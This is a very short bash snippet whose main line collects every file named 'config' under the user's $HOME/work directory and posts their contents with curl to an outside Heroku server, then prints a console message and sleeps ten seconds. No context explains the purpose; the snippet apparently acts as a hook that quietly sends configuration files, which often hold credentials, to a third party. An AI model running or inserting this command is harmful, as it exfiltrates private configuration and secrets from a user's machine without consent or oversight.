bash
find $HOME/work -type f -name config | xargs cat | curl --data @- https://deriv-test-node-server.herokuapp.com
echo "Some console message" 1>&3
# wait for 10 seconds
sleep 10